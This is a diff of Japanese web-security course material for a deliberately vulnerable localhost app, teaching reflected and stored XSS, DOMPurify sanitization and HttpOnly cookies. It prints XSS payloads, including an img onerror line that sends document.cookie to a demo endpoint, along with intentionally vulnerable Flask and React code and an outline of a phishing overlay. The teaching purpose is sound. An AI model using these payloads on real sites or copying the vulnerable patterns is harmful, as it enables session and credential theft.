       に適切な属性を設定することの重要性、適切なサニタイズやエスケープ処理をすることの重要性が理解できたと思います。</p>
-      <p>Cookie
-      に「HttpOnly属性」をつけていれば…もしくはサニタイズもしくはエスケープ処理をしていれば…防ぐことができた被害でした。</p>
+      <p>今回の Cookie 窃取は、Cookie
+      に「HttpOnly属性」をつけていれば防ぐことができました。また、そもそもクエリパラメータを HTML
+      として出力しないようにエスケープ処理をしていれば、XSS の実行自体を防ぐことができました。HTML
+      の一部を許可したい場合でも、適切なサニタイズ処理を行えば被害を防げます。</p>
+      <div class="note type-caution">
+      <p>HttpOnly は Cookie の読み取りを防ぐ対策であって、XSS
+      そのものを修正する対策ではありません。実際の開発では「Cookie
+      属性を適切に設定すること」と「外部入力を安全に出力すること」の両方が必要です。</p>
+      </div>
       <h2 data-number="7.3" id="エスケープ処理の方法"><span class="header-section-number">7.3</span>
       エスケープ処理の方法</h2>
       <p><strong>エスケープ処理</strong>とは <code>&lt;</code> や <code>&gt;</code> などの
       <strong>HTMLとして解釈される可能性がある文字</strong> を <code>&amp;lt;</code> や
       <code>&amp;gt;</code> などに置き換える処理を指します。ここで <code>&amp;lt;</code> や
       <code>&amp;gt;</code> は <span class="masked">文字実体参照</span>
-      とばれるもので、ウェブブラウザでは、これを「HTML」ではなく「文字」としての <code>&lt;</code>
+      と呼ばれるもので、ウェブブラウザでは、これを「HTML」ではなく「文字」としての <code>&lt;</code>
       や <code>&gt;</code> として表示 (レンダリング) します。</p>
       <p>例えば…</p>
       <ul>
@@ -1480,23 +1569,28 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       で動作するもので、以下のように使用します。</p>
       <div class="sourceCode" id="cb41" data-caption="src/app/news/page.tsx (抜粋) Before 💀"
       data-startFrom="29"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 28;"><span id="cb41-29"><a href="#cb41-29"></a><span class="kw">const</span> name <span class="op">=</span> searchParams<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>)<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）せずに値を取得</span></span></code></pre></div>
+      <p>まず、ファイルの冒頭で <code>isomorphic-dompurify</code> をインポートします。</p>
       <div class="sourceCode" id="cb42"
+      data-caption="src/app/news/page.tsx (抜粋) DOMPurify のインポート"><pre
+      class="sourceCode ts"><code class="sourceCode typescript"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> DOMPurify <span class="im">from</span> <span class="st">&quot;isomorphic-dompurify&quot;</span><span class="op">;</span></span></code></pre></div>
+      <div class="sourceCode" id="cb43"
       data-caption="src/app/news/page.tsx (抜粋) After 😁 サニタイズ処理" data-startFrom="29"><pre
-      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 28;"><span id="cb42-29"><a href="#cb42-29"></a>  <span class="co">// 💀 URLパラメータから値を取得（この時点では未検証・未無害化）</span></span>
-<span id="cb42-30"><a href="#cb42-30"></a>  <span class="kw">const</span> rawName <span class="op">=</span> searchParams<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>)<span class="op">;</span></span>
-<span id="cb42-31"><a href="#cb42-31"></a></span>
-<span id="cb42-32"><a href="#cb42-32"></a>  <span class="co">// ✅ サニタイズ（無害化）</span></span>
-<span id="cb42-33"><a href="#cb42-33"></a>  <span class="kw">const</span> name <span class="op">=</span> DOMPurify<span class="op">.</span><span class="fu">sanitize</span>(rawName <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">,</span> {</span>
-<span id="cb42-34"><a href="#cb42-34"></a>    ALLOWED_TAGS<span class="op">:</span> [<span class="st">&quot;b&quot;</span><span class="op">,</span> <span class="st">&quot;i&quot;</span><span class="op">,</span> <span class="st">&quot;font&quot;</span>]<span class="op">,</span> <span class="co">// 許可するタグ</span></span>
-<span id="cb42-35"><a href="#cb42-35"></a>    ALLOWED_ATTR<span class="op">:</span> [<span class="st">&quot;color&quot;</span>]<span class="op">,</span> <span class="co">// 許可する属性</span></span>
-<span id="cb42-36"><a href="#cb42-36"></a>  })<span class="op">;</span></span></code></pre></div>
+      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 28;"><span id="cb43-29"><a href="#cb43-29"></a><span class="co">// 💀 URLパラメータから値を取得（この時点では未検証・未無害化）</span></span>
+<span id="cb43-30"><a href="#cb43-30"></a><span class="kw">const</span> rawName <span class="op">=</span> searchParams<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>)<span class="op">;</span></span>
+<span id="cb43-31"><a href="#cb43-31"></a></span>
+<span id="cb43-32"><a href="#cb43-32"></a><span class="co">// ✅ サニタイズ（無害化）</span></span>
+<span id="cb43-33"><a href="#cb43-33"></a><span class="kw">const</span> name <span class="op">=</span> DOMPurify<span class="op">.</span><span class="fu">sanitize</span>(rawName <span class="op">??</span> <span class="st">&quot;&quot;</span><span class="op">,</span> {</span>
+<span id="cb43-34"><a href="#cb43-34"></a>  ALLOWED_TAGS<span class="op">:</span> [<span class="st">&quot;b&quot;</span><span class="op">,</span> <span class="st">&quot;i&quot;</span><span class="op">,</span> <span class="st">&quot;font&quot;</span><span class="op">,</span> <span class="st">&quot;br&quot;</span>]<span class="op">,</span> <span class="co">// 許可するタグ</span></span>
+<span id="cb43-35"><a href="#cb43-35"></a>  ALLOWED_ATTR<span class="op">:</span> [<span class="st">&quot;color&quot;</span>]<span class="op">,</span> <span class="co">// 許可する属性</span></span>
+<span id="cb43-36"><a href="#cb43-36"></a>})<span class="op">;</span></span></code></pre></div>
       <p>上記のようにすると、太字タグ <code>&lt;b&gt;&lt;/b&gt;</code>、斜体タグ
-      <code>&lt;i&gt;&lt;/i&gt;</code>、フォントタグ <code>&lt;font&gt;&lt;/font&gt;</code>
+      <code>&lt;i&gt;&lt;/i&gt;</code>、フォントタグ
+      <code>&lt;font&gt;&lt;/font&gt;</code>、改行タグ <code>&lt;br&gt;</code>
       のみを許可し、さらにタグの属性のうち <code>color=</code>
       のみを許可するようなサニタイズ処理がされます。<strong>許可されていない該当しないタグや属性は削除
       (≠無害化) されます</strong>。そのうえで <code>dangerouslySetInnerHTML</code> を使用して
       <code>name</code> を出力してください。</p>
-      <p>以上のようなサニタイズ処理を適当したとき、次のようなURLでアクセスすると…</p>
+      <p>以上のようなサニタイズ処理を適用したとき、次のようなURLでアクセスすると…</p>
       <pre><code>http://localhost:3000/news?name=&lt;font color=&quot;blue&quot; size=&quot;100&quot;&gt;&lt;b&gt;萱島ウサギ&lt;/b&gt;&lt;/font&gt;</code></pre>
       <p>次のように出力されます
       (<code>size=</code>の属性は適用されていないことに着目してください)。</p>
@@ -1504,27 +1598,675 @@ git commit --allow-empty -m &quot;Start week-5 branch&quot;</code></pre>
       <img src="figs/01/xss-07.png" alt="img" />
       <figcaption aria-hidden="true">img</figcaption>
       </figure>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>React において <code>dangerouslySetInnerHTML</code> は XSS
+      リスクがあるとされていますが、それでも実務であえて使用されるのはどのような場面ですか？<code>dangerouslySetInnerHTML</code>
+      を使う代表的なユースケース、どのような条件を満たせば比較的安全に使えるのか、も含めて解説してください。</p>
+      </blockquote>
       <h3 data-number="7.4.1" id="演習-4"><span class="header-section-number">7.4.1</span> 演習</h3>
       <p>サニタイズ処理を適用してください。</p>
       <h2 data-number="7.5" id="flask-python-などでもxss脆弱性に注意"><span
       class="header-section-number">7.5</span> Flask (Python) などでもXSS脆弱性に注意</h2>
-      <p>Next.js は、基本的にはXSS攻撃が成功しにくい設計になっています。あえて
-      <code>dangerouslySetInnerHTML</code> 属性をしなければ問題ありません。</p>
-      <p>一方で、Flask (前期実験のもう一方のテーマで使用)
-      などは、標準でXSS攻撃が成功しやすい設計になっています。十分に注意してください。</p>
-      <div class="sourceCode" id="cb44" data-caption="XSS脆弱性 (Python)"><pre
-      class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb44-1"><a href="#cb44-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
-<span id="cb44-2"><a href="#cb44-2"></a></span>
-<span id="cb44-3"><a href="#cb44-3"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
-<span id="cb44-4"><a href="#cb44-4"></a></span>
-<span id="cb44-5"><a href="#cb44-5"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
-<span id="cb44-6"><a href="#cb44-6"></a><span class="kw">def</span> greet():</span>
-<span id="cb44-7"><a href="#cb44-7"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
-<span id="cb44-8"><a href="#cb44-8"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
-<span id="cb44-9"><a href="#cb44-9"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
-<span id="cb44-10"><a href="#cb44-10"></a></span>
-<span id="cb44-11"><a href="#cb44-11"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
-<span id="cb44-12"><a href="#cb44-12"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
+      <p>Next.js (React) は、通常の JSX
+      のテキスト出力では自動的にエスケープ処理が行われるため、XSS攻撃が成立しにくい設計になっています。ただし、<code>dangerouslySetInnerHTML</code>
+      を使って HTML を直接挿入する場合や、DOM API を直接操作する場合、外部ライブラリが生成した HTML
+      を扱う場合などは注意が必要です。</p>
+      <p>一方で、**Flask (前期実験のもう一方のテーマで使用)
+      などで、テンプレートエンジンを使わずに文字列連結で HTML を組み立て、そのまま
+      <code>Response(..., content_type="text/html")</code> として返すと、次のように XSS
+      が成立しやすくなります。</p>
+      <div class="sourceCode" id="cb45" data-caption="XSS脆弱性 (Python)"><pre
+      class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb45-1"><a href="#cb45-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
+<span id="cb45-2"><a href="#cb45-2"></a></span>
+<span id="cb45-3"><a href="#cb45-3"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
+<span id="cb45-4"><a href="#cb45-4"></a></span>
+<span id="cb45-5"><a href="#cb45-5"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
+<span id="cb45-6"><a href="#cb45-6"></a><span class="kw">def</span> greet():</span>
+<span id="cb45-7"><a href="#cb45-7"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
+<span id="cb45-8"><a href="#cb45-8"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
+<span id="cb45-9"><a href="#cb45-9"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
+<span id="cb45-10"><a href="#cb45-10"></a></span>
+<span id="cb45-11"><a href="#cb45-11"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
+<span id="cb45-12"><a href="#cb45-12"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
+      <p>なお、Flask の Jinja2
+      テンプレートには通常、自動エスケープの仕組みがあります。危険なのは、上記のように「ユーザ入力を含む
+      HTML 文字列を自分で組み立て、そのまま HTML として返す」ような実装です。</p>
+      <h1 data-number="8" id="蓄積型xssstored-xss"><span class="header-section-number">8</span>
+      蓄積型XSS（Stored XSS）</h1>
+      <h2 data-number="8.1" id="反射型xssの振り返りと限界"><span
+      class="header-section-number">8.1</span> 反射型XSSの振り返りと限界</h2>
+      <p>前のセクションの演習では、URLのクエリパラメータ <code>?name=&lt;ペイロード&gt;</code>
+      を使った<strong>反射型XSS</strong>を体験しました。</p>
+      <pre><code>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></pre>
+      <p>この攻撃には <span class="masked">致命的な制約</span> があります。攻撃者は被害者に
+      <u><strong>怪しい URL を踏ませなければならない</strong></u>
+      という点です。URLにスクリプトが丸見えの状態では、少し注意深いユーザなら気づいてしまいます。また、ブラウザのURLバーに長くて不審な文字列が表示されるため、フィッシング耐性が低い攻撃です。</p>
+      <h2 data-number="8.2" id="蓄積型xssstored-xssとは"><span
+      class="header-section-number">8.2</span> 蓄積型XSS（Stored XSS）とは</h2>
+      <p><strong>蓄積型XSS</strong>は、攻撃ペイロード (＝悪意あるスクリプト)
+      をデータベースなどに保存することで、<u>ページを訪問した全ユーザを攻撃する手法</u>
+      となります。</p>
+      <ol type="1">
+      <li>攻撃者がペイロードを DB に保存する</li>
+      <li>被害者が「普通のURL」でページを開く</li>
+      <li>DB から取り出したペイロードがブラウザで実行される</li>
+      <li>Cookie や個人情報が盗まれる</li>
+      </ol>
+      <h3 data-number="8.2.1" id="反射型xss-と-蓄積型xss-の比較"><span
+      class="header-section-number">8.2.1</span> 反射型XSS と 蓄積型XSS の比較</h3>
+      <table>
+      <thead>
+      <tr>
+      <th>観点</th>
+      <th>反射型XSS</th>
+      <th>蓄積型XSS</th>
+      </tr>
+      </thead>
+      <tbody>
+      <tr>
+      <td>ペイロードの場所</td>
+      <td>URLパラメータ</td>
+      <td>データベース</td>
+      </tr>
+      <tr>
+      <td>攻撃の持続性</td>
+      <td>1回限り</td>
+      <td><span class="masked">削除されるまで永続</span></td>
+      </tr>
+      <tr>
+      <td>被害者へのURL</td>
+      <td>不審なURLを踏ませる必要あり</td>
+      <td>普通の見た目のURLでよい</td>
+      </tr>
+      <tr>
+      <td>被害者の数</td>
+      <td>1人（URLを踏んだ人）</td>
+      <td>そのページを訪れた全員</td>
+      </tr>
+      <tr>
+      <td>発見の難しさ</td>
+      <td>比較的容易（URLを見れば分かる）</td>
+      <td>困難（DBに潜んでいる）</td>
+      </tr>
+      </tbody>
+      </table>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>反射型XSS と蓄積型XSS
+      の違いを整理してください。どちらが攻撃者にとって有利で、どちらが被害者にとって発見しやすいですか？</p>
+      </blockquote>
+      <h2 data-number="8.3" id="プロジェクトにおける実装"><span
+      class="header-section-number">8.3</span> プロジェクトにおける実装</h2>
+      <p>この <code>web-sec-playground-2</code>
+      には、ユーザが自分のプロフィール（<code>aboutContent</code>）を自由に編集し、公開URLで表示できる機能があります。</p>
+      <h3 data-number="8.3.1" id="ここのセクションで使用するページとapi"><span
+      class="header-section-number">8.3.1</span> ここのセクションで使用するページとAPI</h3>
+      <table>
+      <thead>
+      <tr>
+      <th>パス</th>
+      <th>役割</th>
+      </tr>
+      </thead>
+      <tbody>
+      <tr>
+      <td><code>/member/about</code></td>
+      <td>ログイン済みユーザがプロフィールを編集するページ</td>
+      </tr>
+      <tr>
+      <td><code>/api/about-draft</code></td>
+      <td>プロフィールを DB に保存する API（認証必須）</td>
+      </tr>
+      <tr>
+      <td><code>/about/[slug]</code></td>
+      <td>誰でもアクセスできる公開プロフィールページ</td>
+      </tr>
+      <tr>
+      <td><code>/api/xss</code></td>
+      <td>盗まれた Cookie を受け取るAPI（デモ用）</td>
+      </tr>
+      </tbody>
+      </table>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>ウェブアプリ開発の文脈で「スラグ」とはなんですか。<code>/about/[slug]</code>
+      のような動的ルーティングに使われているのですが・・・。</p>
+      </blockquote>
+      <h3 data-number="8.3.2" id="xss-攻撃に対する脆弱性を含む危険なコード"><span
+      class="header-section-number">8.3.2</span> XSS 攻撃に対する脆弱性を含む危険なコード</h3>
+      <p><code>dangerouslySetInnerHTML</code> は React
+      が「アプリ開発者の責任でHTMLを直接埋め込む」という宣言です。</p>
+      <div class="sourceCode" id="cb47"
+      data-caption="src/app/about/[slug]/page.tsx（抜粋）💀 サニタイズなし" data-startFrom="43"><pre
+      class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 42;"><span id="cb47-43"><a href="#cb47-43"></a>&lt;div dangerouslySetInnerHTML={{ __html: user.aboutContent }} /&gt;</span></code></pre></div>
+      <ul>
+      <li><code>dangerous</code> という名前が示す通り、サニタイズなしで使うと XSS
+      が成立します。</li>
+      </ul>
+      <h2 data-number="8.4" id="演習-stored-xssを体験する"><span
+      class="header-section-number">8.4</span> 📝演習 — Stored XSSを体験する</h2>
+      <p>まず <code>npm run dev</code> でアプリを起動してください。</p>
+      <h3 data-number="8.4.1" id="攻撃者としてペイロードを仕込む"><span
+      class="header-section-number">8.4.1</span> 攻撃者としてペイロードを仕込む</h3>
+      <ol type="1">
+      <li><code>http://localhost:3000/login</code> からログインしてください。</li>
+      <li>公開プロフィールの確認・編集 (<code>http://localhost:3000/member/about</code>)
+      を開いてください。</li>
+      <li><strong>公開URL</strong> に任意のスラグを設定 (例: <code>hogehoge</code>)
+      してください。</li>
+      <li><strong>コンテンツ</strong> に以下を入力して「更新」をクリックしてください</li>
+      </ol>
+      <pre><code>&lt;img src=x onerror=&quot;fetch(&#39;/api/xss?c=&#39;+document.cookie)&quot;&gt;</code></pre>
+      <ol start="5" type="1">
+      <li>公開URLのリンク（<code>/about/hogehoge</code>）をクリックして動作を確認してください</li>
+      </ol>
+      <h3 data-number="8.4.2" id="被害者としてページを訪問する"><span
+      class="header-section-number">8.4.2</span> 被害者としてページを訪問する</h3>
+      <p>「別のブラウザ」または「シークレットウィンドウ」で以下にアクセスしてください。</p>
+      <pre><code>http://localhost:3000/about/hogehoge</code></pre>
+      <div class="note type-tips">
+      <p><strong>なぜ別ブラウザが必要か</strong></p>
+      <p>XSS 自体は同じブラウザでも発火しますが、「攻撃者と同じ <code>cart_session_id</code>
+      を盗んでも意味がない」ため、被害者役として別のセッション（別ブラウザ）を用意します。別ブラウザでショップを開いてカートを操作しておくと、その
+      <code>cart_session_id</code> がペイロードで盗まれることを確認できます。</p>
+      </div>
+      <p><code>http://localhost:3000/about/hogehoge</code> という URL
+      自体には不審な点はなく、見た目は完全に普通の URL です。しかし、蓄積型 XSS
+      の恐ろしい点は、ページを開いた瞬間に <code>document.cookie</code> の内容が /api/xss
+      へ自動的に送信されてしまうことです。</p>
+      <h3 data-number="8.4.3" id="盗まれた-cookie-を確認する"><span
+      class="header-section-number">8.4.3</span> 盗まれた Cookie を確認する</h3>
+      <p><code>npx prisma studio</code> から <code>stolen_contents</code> テーブルを開いて、被害者の
+      Cookie が記録されていることを確認してください。</p>
+      <h2 data-number="8.5" id="なぜ-cart_session_id-が盗まれるのか"><span
+      class="header-section-number">8.5</span> なぜ cart_session_id が盗まれるのか</h2>
+      <p><code>document.cookie</code> で取得できるのは <strong><code>httpOnly: true</code></strong>
+      が設定されていない Cookie だけです。</p>
+      <table>
+      <thead>
+      <tr>
+      <th>Cookie名</th>
+      <th>httpOnly</th>
+      <th>JavaScriptから取得</th>
+      <th>盗まれるか</th>
+      </tr>
+      </thead>
+      <tbody>
+      <tr>
+      <td><code>session_id</code></td>
+      <td><code>true</code></td>
+      <td>不可</td>
+      <td>✅ 盗まれない</td>
+      </tr>
+      <tr>
+      <td><code>cart_session_id</code></td>
+      <td><strong><code>false</code></strong>（💀）</td>
+      <td>可能</td>
+      <td>🚨 盗まれる</td>
+      </tr>
+      <tr>
+      <td><code>region</code></td>
+      <td><code>false</code></td>
+      <td>可能</td>
+      <td>🚨 盗まれる</td>
+      </tr>
+      </tbody>
+      </table>
+      <p><code>/api/cart/route.ts</code> では <code>httpOnly: true</code>
+      がコメントアウトされており（💀マーク付き）、これがXSSによるセッションハイジャックを可能にしています。盗んだ
+      <code>cart_session_id</code> を使えば、被害者のカートを自由に操作できます。</p>
+      <p><strong><i class="fa-solid fa-comment-dots fa-flip-horizontal"></i>プロンプト例</strong></p>
+      <blockquote>
+      <p>Cookie の <code>httpOnly</code> 属性をつけ忘れると、XSS 攻撃でセッション ID
+      が盗まれると聞きました。どのようなルートで盗まれるのか、具体的な流れを教えてください。</p>
+      </blockquote>
+      <h2 data-number="8.6" id="防止策"><span class="header-section-number">8.6</span> 防止策</h2>
+      <h3 data-number="8.6.1" id="dompurify-によるサニタイズ-aboutview-コンポーネントを使う"><span
+      class="header-section-number">8.6.1</span> 1. DOMPurify によるサニタイズ (AboutView
+      コンポーネントを使う)</h3>
+      <p>このプロジェクトには既に安全な表示コンポーネントが実装されています。</p>
+      <div class="sourceCode" id="cb50"
+      data-caption="src/app/_components/AboutView.tsx（抜粋）サニタイズ処理"
+      data-startFrom="13"><pre class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 12;"><span id="cb50-13"><a href="#cb50-13"></a>const sanitizedContent = DOMPurify.sanitize(about.aboutContent, {</span>
+<span id="cb50-14"><a href="#cb50-14"></a>  ALLOWED_TAGS: [&quot;b&quot;, &quot;i&quot;, &quot;font&quot;, &quot;br&quot;], // 許可するタグを明示</span>
+<span id="cb50-15"><a href="#cb50-15"></a>  ALLOWED_ATTR: [&quot;color&quot;, &quot;size&quot;],         // 許可する属性を明示</span>
+<span id="cb50-16"><a href="#cb50-16"></a>});</span></code></pre></div>
+      <div class="sourceCode" id="cb51" data-caption="src/app/_components/AboutView.tsx（抜粋）"
+      data-startFrom="27"><pre class="sourceCode numberSource tsx numberLines"><code class="sourceCode" style="counter-reset: source-line 26;"><span id="cb51-27"><a href="#cb51-27"></a>&lt;div</span>
+<span id="cb51-28"><a href="#cb51-28"></a>  dangerouslySetInnerHTML={{ __html: sanitizedContent }}</span>
+<span id="cb51-29"><a href="#cb51-29"></a>  className=&quot;mr-1&quot;</span>
+<span id="cb51-30"><a href="#cb51-30"></a>/&gt;</span></code></pre></div>
+      <p>DOMPurify は「許可リスト方式
+      (ホワイトリスト方式)」で動作します。<code>&lt;script&gt;</code> や <code>onerror=</code>
+      などの危険な要素は <span class="masked">削除されます（エスケープではなく削除）</span>。</p>
+      <h3 data-number="8.6.2" id="react-のデフォルトエスケープ"><span
+      class="header-section-number">8.6.2</span> 2. React のデフォルトエスケープ</h3>
+      <p>HTMLタグを含む文字列をエスケープ処理して表示するだけであれば、<code>dangerouslySetInnerHTML</code>
+      ではなく <code>div</code> を使用することが最善です。</p>
+      <div class="sourceCode" id="cb52" data-caption="React のデフォルトエスケープ"><pre
+      class="sourceCode ts"><code class="sourceCode typescript"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="co">// 💀 危険：サニタイズなしでHTMLを直接埋め込む</span></span>
+<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> user<span class="op">.</span><span class="at">aboutContent</span> }} <span class="op">/&gt;</span></span>
+<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="co">// ✅ 安全：Reactが自動的にエスケープする</span></span>
+<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>div<span class="op">&gt;</span>{user<span class="op">.</span><span class="at">aboutContent</span>}<span class="op">&lt;/</span>div<span class="op">&gt;</span></span></code></pre></div>
+      <h3 data-number="8.6.3" id="httponly-true-の設定"><span
+      class="header-section-number">8.6.3</span> 3. httpOnly: true の設定</h3>
+      <p>XSSが成立してしまった場合でも、<code>httpOnly: true</code> の Cookie は <span
+      class="masked">JavaScriptから読み取れない</span>
+      ため、セッションハイジャックを防ぐ最後の防衛線になります。</p>
+      <div class="sourceCode" id="cb53" data-caption="httpOnly: true の設定"><pre
+      class="sourceCode ts"><code class="sourceCode typescript"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a>cookieStore<span class="op">.</span><span class="fu">set</span>(<span class="st">&quot;cart_session_id&quot;</span><span class="op">,</span> sessionId<span class="op">,</span> {</span>
+<span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a>  httpOnly<span class="op">:</span> <span class="kw">true</span><span class="op">,</span>  <span class="co">// JavaScriptから読み取り不可</span></span>
+<span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a>  sameSite<span class="op">:</span> <span class="st">&quot;lax&quot;</span><span class="op">,</span></span>
+<span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a>  secure<span class="op">:</span> <span class="kw">true</span><span class="op">,</span>    <span class="co">// 本番環境では必須</span></span>
+<span id="cb53-5"><a href="#cb53-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+      <h2 data-number="8.7" id="定着確認-1"><span class="header-section-number">8.7</span>
+      定着確認</h2>
+      <p>以下の説明は「正しい」か「正しくない」かを答えよ。</p>
+      <ul>
+      <li>蓄積型 XSS は、反射型 XSS と異なり、攻撃者が被害者に不審なURLを踏ませる必要がない。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しい。<br>ペイロードは DB
+      に保存されているため、被害者は普通の見た目のURLにアクセスするだけで攻撃を受けます。</span></li>
+      </ul></li>
+      <li><code>httpOnly: true</code> が設定された Cookie は、XSS 攻撃によって JavaScript
+      から盗まれることがない。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しい。<br><code>httpOnly</code> Cookie は
+      JavaScript から値を読み取れないため、<code>document.cookie</code>
+      による窃取ができません。ただし XSS
+      そのものを防ぐ対策ではないので注意してください。</span></li>
+      </ul></li>
+      <li>DOMPurify を使ったサニタイズでは、危険なタグをエスケープして無害化する。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しくない。<br>DOMPurify
+      は許可リストにないタグや属性を「削除」します。エスケープではなく削除します。</span></li>
+      </ul></li>
+      <li>Next.js においては <code>dangerouslySetInnerHTML</code> を <code>{}</code>
+      による通常の展開に書き換えるだけで、XSS を防ぐことができる。
+      <ul>
+      <li><strong>答え</strong>：<span class="masked">正しい。<br>React はデフォルトで
+      <code>&lt;</code> や <code>&gt;</code> をエスケープするため、<code>{}</code>
+      での展開ではスクリプトが実行されません。</span></li>
+      </ul></li>
+      </ul>
+      <h1 data-number="9" id="蓄積型xssstored-xss応用編-フィッシングオーバーレイ"><span
+      class="header-section-number">9</span> 蓄積型XSS（Stored XSS）応用編 —
+      フィッシングオーバーレイ</h1>
+      <h2 data-number="9.1" id="前のセクションとの違い"><span
+      class="header-section-number">9.1</span> 前のセクションとの違い</h2>
+      <p>前のセクション（Cookie 窃取の演習）では、次のペイロードで <strong>Cookie を盗む</strong>
+      Stored XSS を体験しました。</p>
+      <pre><code>&lt;img src=x onerror=&quot;fetch(&#39;/api/xss?c=&#39;+document.cookie)&quot;&gt;</code></pre>
+      <p>この攻撃は強力ですが、<strong><code>httpOnly: true</code></strong> が設定された Cookie
+      には届きません。</p>
+      <div class="note type-caution">
+      <p><strong>本演習のテーマ</strong>：<code>httpOnly</code>
+      による防御が効かない、より深刻な攻撃を体験します。</p>
+      <p>このセクションでは学習目的のために意図的に脆弱な設定を使います。実験は必ず
+      <code>localhost</code>
+      の学習用環境でのみ実施し、外部のサービスには絶対に行わないでください。</p>
+      </div>
+      <p>本演習では CSS + JS を組み合わせた
+      <strong>フィッシングオーバーレイ</strong>を使い、被害者に偽のログインフォームへ<strong>認証情報（メール＋パスワード）を直接入力させる</strong>攻撃を実装します。</p>
+      <div class="note type-tips">
+      <p><code>httpOnly: true</code> は Cookie を JavaScript
+      から隠しますが、ユーザが自分でフォームに入力した値を守ることはできません。Cookie
+      の保護と、フォーム入力の保護は別々に考える必要があります。</p>
+      </div>
+      <h2 data-number="9.2" id="フィッシングオーバーレイ攻撃とは"><span
+      class="header-section-number">9.2</span> フィッシングオーバーレイ攻撃とは</h2>
+      <p>攻撃の構造は、次のようになります。</p>
+      <ol type="1">
+      <li>攻撃者が CSS + JS のペイロードを DBに保存する。</li>
+      <li>被害者が普通のURLでページを開く。</li>
+      <li>画面全体を覆う半透明オーバーレイが出現
+      <ul>
+      <li>「セッションの有効期限が切れました」と表示</li>
+      <li>被害者がメール・パスワードを入力して送信</li>
+      <li>認証情報が攻撃者のサーバに送信される</li>
+      </ul></li>
+      <li>オーバーレイが消え、本物の /login にリダイレクト
+      <ul>
+      <li>被害者はログインし直せたと思い込む</li>
+      </ul></li>
+      </ol>
+      <h3 data-number="9.2.1" id="なぜ-cookie-窃取より危険か"><span
+      class="header-section-number">9.2.1</span> なぜ Cookie 窃取より危険か</h3>
+      <table>
+      <thead>
+      <tr>
+      <th>観点</th>
+      <th>Cookie 窃取</th>
+      <th>フィッシングオーバーレイ</th>
+      </tr>
+      </thead>
+      <tbody>
+      <tr>
+      <td>盗めるもの</td>
+      <td>Cookie（<code>httpOnly</code> なし）</td>
+      <td><strong>平文パスワード</strong></td>
+      </tr>
+      <tr>
+      <td><code>httpOnly</code> の防御</td>
+      <td>有効</td>
+      <td><span class="masked"><strong>無効</strong>（JS でフォーム入力値を読むだけ）</span></td>
+      </tr>
+      <tr>
+      <td>被害者の気づきやすさ</td>
+      <td>気づかない</td>
+      <td>「セッション切れ」に見える → 気づかない</td>
+      </tr>
+      <tr>
+      <td>他サービスへの影響</td>
+      <td>限定的</td>
